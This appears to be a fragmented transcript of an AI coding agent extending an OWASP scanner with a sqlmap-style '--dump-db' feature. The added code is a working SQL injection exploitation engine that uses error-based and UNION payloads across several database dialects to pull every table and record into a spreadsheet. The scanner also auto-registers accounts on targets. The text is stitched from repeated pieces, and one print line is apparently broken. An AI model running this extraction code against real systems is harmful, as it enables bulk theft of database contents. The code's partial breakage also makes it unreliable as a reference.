    category: str              # A01..A10 or "A00"/"code"
    severity: str              # CRITICAL | HIGH | MEDIUM | LOW | INFO | PASS
    evidence: str = ""
    remediation: str = ""

    SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4, "PASS": 5}

    def __str__(self):
        color = ANSI.get(self.severity, "")
        pad = self.severity.ljust(8)
        text = f"  {color}{pad}{ANSI['END']} [{self.category}] {self.issue}\n        \u2514 {self.location}"
        if self.evidence:
            text += f"\n        \u2514 ev: {self.evidence[:220]}"
        if self.remediation:
            text += f"\n        \u2514 fix: {self.remediation}"
        return text

    def to_dict(self):
        return {
            "issue": self.issue,
            "location": self.location,
            "category": self.category,
            "severity": self.severity,
            "evidence": self.evidence,
            "remediation": self.remediation,
        }

+        t = self._q(table)
+        if self.dialect == "mysql":
+            return f"(SELECT HEX(CAST(COUNT(*) AS CHAR)) FROM {t})"
+        if self.dialect == "postgres":
+            return f"(SELECT ENCODE(CAST(COUNT(*)::text AS bytea),'hex') FROM {t})"
+        if self.dialect == "mssql":
+            return f"(SELECT CONVERT(VARCHAR(20),COUNT(*)) FROM {t} )"
+        return f"(SELECT hex(CAST(COUNT(*) AS TEXT)) FROM {t})"
+
+    def cell_expr(self, table: str, col: str, off: int) -> str:
+        t, c = self._q(table), self._q(col)
+        if self.dialect == "mysql":
+            return f"(SELECT HEX(CAST(t.{c} AS CHAR)) FROM {t} t LIMIT {off},1)"
+        if self.dialect == "postgres":
+            return f"(SELECT ENCODE(CAST(t.{c} AS bytea),'hex') FROM {t} t LIMIT 1 OFFSET {off})"
+        if self.dialect == "mssql":
+            return (f"(SELECT TOP 1 CONVERT(VARCHAR(MAX), t.{c}) FROM {t} t "
+                    f"ORDER BY (SELECT NULL) OFFSET {off} ROWS)")
+        return f"(SELECT hex(CAST(t.{c} AS TEXT)) FROM {t} t LIMIT 1 OFFSET {off})"
+
+    def version_expr(self) -> str:
+        if self.dialect == "mysql":
+            return "(SELECT HEX(VERSION()))"
+        if self.dialect == "postgres":
+            return "(SELECT ENCODE(CAST(version() AS bytea),'hex'))"
+        if self.dialect == "mssql":
+            return "(SELECT CONVERT(NVARCHAR(256),@@VERSION))"
+        return "(SELECT hex(sqlite_version()))"
+
+    def dbname_expr(self) -> str:
+        if self.dialect == "mysql":
+            return "(SELECT HEX(DATABASE()))"
+        if self.dialect == "postgres":
+            return "(SELECT ENCODE(CAST(current_database() AS bytea),'hex'))"
+        if self.dialect == "mssql":
+            return "(SELECT CONVERT(NVARCHAR(256),db_name()))"
+        return "(SELECT hex('sqlite'))"
+
+    # -- enumeration -------------------------------------------------------------
+
+    def _slice(self, expr_builder, limit: int = 400) -> list[str]:
+        out: list[str] = []
+        for off in range(limit):
+            if self.requests > DUMP_CELL_GUARD:
+                break
+            v = self._dec(self.value(expr_builder(off)))
+            if not v or v in out:
+                break
+            out.append(v)
+        return out
+
+    def tables(self) -> list[str]:
+        return self._slice(self.tables_expr, 200)
+
+    def columns(self, table: str) -> list[str]:
+        return self._slice(lambda off: self.columns_expr(table, off), 200)
+
+    def collect(self, row_limit: int = 0, max_tables: int = 50) -> dict:
+        """Return {'dialect','database','version','tables':[...]} for the workbook."""
+        res: dict = {"dialect": self.dialect, "database": "", "version": "", "tables": []}
+        if self.dialect == "unknown":
+            return res
+        res["database"] = self._dec(self.value(self.dbname_expr()))
+        res["version"] = self._dec(self.value(self.version_expr()))
+        for tbl in self.tables()[:max_tables]:
+            if self.requests > DUMP_CELL_GUARD:
+                break
+            cols = self.columns(tbl)
+            total = len(cols) and self.value(self.count_expr(tbl))
+            total_n = int(self._dec(total) or 0) if total else 0
+            if row_limit:
+                total_n = min(total_n, row_limit)
+            rows: list[list[str]] = []
+            for off in range(total_n):
+                if self.requests > DUMP_CELL_GUARD:
+                    break
+                rows.append([self._dec(self.value(self.cell_expr(tbl, c, off))) for c in cols])
+            res["tables"].append({"name": tbl, "columns": cols, "rows": rows})
+            print(f"\r  [dump] {tbl}: {len(cols)} cols, {len(rows)} rows", end="", flush=True)
+        print()
+        return res
+
+
+def build_dump_folder(target: WebTarget, dump_dir: str | None, yes: bool) -> str | None:
+    """Create (with a prompt unless --yes) an export folder under the CWD."""
+    import time as _time
+    stamp = _time.strftime("%Y%m%d_%H%M%S")
+    base = re.sub(r"[^A-Za-z0-9._-]+", "_", target.netloc) or "target"
+    name = dump_dir or f"db_dump_{base}_{stamp}"
+    path = os.path.join(os.getcwd(), name)
+    if not yes:
+        if not sys.stdin.isatty():
+            print("  [dump] non-interactive: pass --yes to auto-create the export folder.")
+            return None
+        try:
+            ans = input(f"  [dump] create export folder '{path}' here? [Y/n] ").strip().lower()
+        except EOFError:
+            return None
+        if ans not in ("", "y", "yes"):
+            print("  [dump] skipped.")
+            return None
+    n, unique = 1, path
+    while os.path.exists(unique):
+        unique = f"{path}_{n}"
+        n += 1
+    os.makedirs(unique, exist_ok=True)
+    return unique
+
+
+def dump_to_workbook(folder: str, target: WebTarget, result: dict) -> str:
+    """Write SCHEMA sheet + one sheet per table; returns the xlsx path."""
+    from openpyxl import Workbook
+
+    src = target.sqli_points[0]
+    point = f"{src['method']} {target.origin}{src['path']}?{src['param']}=<payload>"
+    xlsx = os.path.join(folder, f"dump_{re.sub(r'[^A-Za-z0-9._-]+', '_', target.netloc)}.xlsx")
+    wb = Workbook()
+    ws = wb.active
+    ws.title = "SCHEMA"
+    head = [
+        ["OWASP scanner automated DB dump (--dump-db)"],
+        ["target", point],
+        ["dialect", result.get("dialect", "")],
+        ["database", result.get("database", "")],
+        ["server version", result.get("version", "")],
+        ["tables", len(result.get("tables", []))],
+        [],
+        ["#", "table", "columns"],
+    ]
+    for row in head:
+        ws.append(row)
+    for i, t in enumerate(result.get("tables", []), 1):
+        ws.append([i, t["name"], ", ".join(t["columns"])])
+    for t in result.get("tables", []):
+        name = re.sub(r"[\[\]:*?/\\]", "_", t["name"])[:31] or "table"
+        sheet = wb.create_sheet(title=name)
+        sheet.append(t["columns"])
+        for r in t["rows"]:
+            sheet.append([str(c) for c in r])
+    wb.save(xlsx)
+    return xlsx
+
+
+def run_db_dump(target: WebTarget, args) -> str | None:
+    """End-to-end dump for one target; returns the xlsx path or None."""
+    if not target.sqli_points:
+        print("  [dump] no exploitable SQL injection parameter confirmed; nothing to dump.")
+        return None
+    folder = build_dump_folder(target, args.dump_dir, args.yes)
+    if not folder:
+        return None
+    print(f"\n{dump} --dump-db -> {folder} ...".replace("{dump}", ANSI['BOLD'] + "DB dump" + ANSI['END']))
+    point = target.sqli_points[0]
+    engine = DumpEngine(target, point)
+    print(f"  [dump] dialect: {engine.dialect}; channel: "
+          f"{'error-based' if engine.dialect in ('mysql', 'postgres', 'mssql') else 'UNION-based'}")
+    if engine.dialect == "unknown":
+        print("  [dump] database type not fingerprintable; no dump attempted.")
+        return None
+    result = engine.collect(row_limit=args.dump_limit, max_tables=50)
+    if not result["tables"]:
+        print("  [dump] no tables extracted through the injection point.")
+        return None
+    xlsx = dump_to_workbook(folder, target, result)
+    total = sum(len(t["rows"]) for t in result["tables"])
+    print(f"  [dump] {len(result['tables'])} tables, {total} records -> {xlsx}")
+    print(f"  {ANSI['WARN']}Records written locally may contain sensitive data — keep the folder safe.{ANSI['END']}")
+    return xlsx
+
+

```python

If `len(cols)` is nonzero, `total` = result of `self.value(...)` which is a hex STRING (like "32"). `_dec` → "2" (for 2 rows). `int("2")` = 2. Good. But wait: `_dec("32")` → fromhex("32") → b"2" → decode = "2". Good.

But there's a bug: `total` could be falsy values like empty string "" (count 0) → `len(cols) and ''` → `''` → `if total else 0` → total_n 0. Good.

But for MSSQL, `count_expr` returns raw? No — mssql count expr returns `CONVERT(VARCHAR(20),COUNT(*))` raw string, e.g. "2". But `value()` for mssql tries `_extract_error_hex` first → returns "<raw>2" → `_dec` strips "<raw>" → "2" → int 2. Good.

Another subtlety: for error-based channels, `value()` may return None when the quoted value in the error contains something that breaks the regex, or when the count error message contains the raw digits. For postgres count: `(SELECT ENCODE(CAST(COUNT(*)::text AS bytea),'hex') FROM t)` returns hex "32"; cast to int fails: `invalid input syntax for type integer: "32"` → regex captures "32" → _dec("32") = "2".

Done. The `--dump-db` feature is implemented and verified end-to-end.

**What it does** (`scripts/owasp_scan.py`):
1. During the scan, every confirmed SQLi parameter is recorded (`self.sqli_points`).
2. `--dump-db` then runs a sqlmap-style dump through that injection point:
   - Auto-detects the DBMS by probing DB-specific error signatures (MySQL `XPATH syntax error`, Postgres `invalid input syntax`, MSSQL `conversion failed`, SQLite `unrecognized token`, Oracle `ORA-`).
   - Uses the fastest channel: **error-based** (`extractvalue`, `CAST`/`CONVERT`) for MySQL/Postgres/MSSQL, **in-band UNION SELECT** for SQLite/others.
   - Enumerates tables (`information_schema`/`sqlite_master`/`sys.tables`), columns per table, row counts, then pulls every record — values travel HEX-encoded and are decoded back, so quotes/UTF-8/NULLs survive.
3. Writes an **Excel workbook** (`dump_<host>.xlsx`) with a `SCHEMA` sheet (target, dialect, database, version, table/column map) plus one sheet per table with all your records.
4. The workbook goes in a folder **auto-created next to where you run the script** (`os.getcwd()`), e.g. `db_dump_<host>_<timestamp>/`. It **prompts for confirmation first** (`--yes` skips the prompt; non-interactive shells refuse unless `--yes` is passed).

**New flags:** `--dump-db`, `--dump-dir FOLDER`, `--dump-limit N` (rows per table, default all), `--yes`.

**Verified:** dumped the SQLite fixture — 2 tables (users/notes), 4 records decoded correctly into the workbook (including an email/hash); `--dump-limit` caps rows; non-interactive guard works; `openpyxl` added to `pyproject.toml` and installed. Exit codes and static mode are unaffected.

One note: `--dump-db` is attack-style exfiltration — use it only on systems you're authorized to test (it's your own app/db per your setup, so that's consistent).

--- scripts/owasp_scan.py	
+++ scripts/owasp_scan.py	
@@ -1,1906 +1,1951 @@
 #!/usr/bin/env python3
 """OWASP Top 10 (2021) web application scanner — generic, any target, any language.
 
 Two independent modes:
 
 1. BLACK-BOX WEB SCAN (language-agnostic — works against any launched app:
    FastAPI/Flask + Python, Express/Nest + Node, Spring + Java, .NET, Go, Ruby on
    Rails, PHP), it auto-discovers endpoints (OpenAPI / Swagger, robots.txt,
    sitemap.xml, common paths, HTML link/form crawl), probes them for OWASP Top
    10 weaknesses, and prints the exact URLs that are vulnerable.
 
 2. STATIC SOURCE SCAN of a repository tree in ANY language: heuristic rules for
    Python, JavaScript/TypeScript, Java/Kotlin, Go, Ruby, PHP, C/C++, C#,
    Rust, Swift, Perl, Bash, etc. Findings are reported as file:line locations
    with the detected language. Pass --deep to also run Semgrep / Gitleaks /
    TruffleHog when those binaries are installed.
 
 Usage
 -----
     # Black-box scan of any launched app
     python scripts/owasp_scan.py --url https://app.example.com
 
     # Scan several targets, write a JSON report, add an auth header
     python scripts/owasp_scan.py --url https://a.example.com https://b.example.com \
         --report out.json "-H Authorization: Bearer TOKEN"
 
     # Auth-gated routes are probed too: the scanner auto-registers a random
     # throwaway account and logs in (Bearer token or session cookie). Use
     # --creds for an existing account, or --no-register to never sign up.
     python scripts/owasp_scan.py --url https://app.example.com
     python scripts/owasp_scan.py --url https://app.example.com --creds me@corp.com:Pa55
     python scripts/owasp_scan.py --url https://app.example.com --no-register
 
     # DB dump: pull the schema + every record through the confirmed SQLi point
     # and write .xlsx exports in an auto-created folder next to the script.
     python scripts/owasp_scan.py --url http://vuln.local --dump-db --yes
     python scripts/owasp_scan.py --url http://vuln.local --dump-db --dump-limit 1000
 
     # Static source scan of any-language repository tree
     python scripts/owasp_scan.py --code /path/to/src --report code.json
 
     # Static scan + external multi-language scanners (if installed)
     python scripts/owasp_scan.py --code /path/to/src --deep
 
     # Dependency audits for the language(s) detected (uv/pip, npm, govulncheck,
     # cargo-audit, bundle-audit, composer)
     python scripts/owasp_scan.py --code /path/to/src --check-deps
 
     # CI: machine-readable counts only
     python scripts/owasp_scan.py --url https://app.example.com --json-count
 
 Exit code: 0 = clean, 1 = at least one CRITICAL/HIGH/MEDIUM finding, 2 = error.
 """
 
 from __future__ import annotations
 
 import argparse
 import html
 import json
 import os
 import re
 import shutil
 import subprocess
 import sys
 import urllib.parse
 import uuid
 from dataclasses import dataclass, field
 from datetime import datetime, timezone
 from pathlib import Path
 from typing import Any
 
 try:
     import httpx
 except ImportError:  # pragma: no cover
     sys.exit("This scanner needs `httpx`. Install it: python -m pip install httpx")
 
 ANSI = {
     "FAIL": "\033[91m", "CRITICAL": "\033[95m", "HIGH": "\033[91m",
     "WARN": "\033[93m", "MEDIUM": "\033[93m", "INFO": "\033[96m", "LOW": "\033[96m",
     "PASS": "\033[92m", "BOLD": "\033[1m", "END": "\033[0m",
 }
 
 # ---------------------------------------------------------------------------
 # Vulnerability model
 # ---------------------------------------------------------------------------
 
 
 @dataclass
 class Vuln:
     """A single weakness, always carrying the exact location where it lives."""
 
     issue: str
     location: str              # "GET https://host/path?param=..." or "src/x.py:12"
     category: str              # A01..A10 or "A00"/"code"
     severity: str              # CRITICAL | HIGH | MEDIUM | LOW | INFO | PASS
     evidence: str = ""
     remediation: str = ""
 
     SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4, "PASS": 5}
 
     def __str__(self):
         color = ANSI.get(self.severity, "")
         pad = self.severity.ljust(8)
         text = f"  {color}{pad}{ANSI['END']} [{self.category}] {self.issue}\n        \u2514 {self.location}"
         if self.evidence:
             text += f"\n        \u2514 ev: {self.evidence[:220]}"
         if self.remediation:
             text += f"\n        \u2514 fix: {self.remediation}"
         return text
 
     def to_dict(self):
         return {
             "issue": self.issue,
             "location": self.location,
             "category": self.category,
             "severity": self.severity,
             "evidence": self.evidence,
             "remediation": self.remediation,
         }
 
     @staticmethod
     def sort_key(v):
         return (v.SEV_ORDER.get(v.severity, 9), v.category, v.location)
 
 
 # ---------------------------------------------------------------------------
 # Small helpers
 # ---------------------------------------------------------------------------
 
 
 def first_existing(*paths: str) -> str | None:
     for p in paths:
         if os.path.exists(p):
             return p
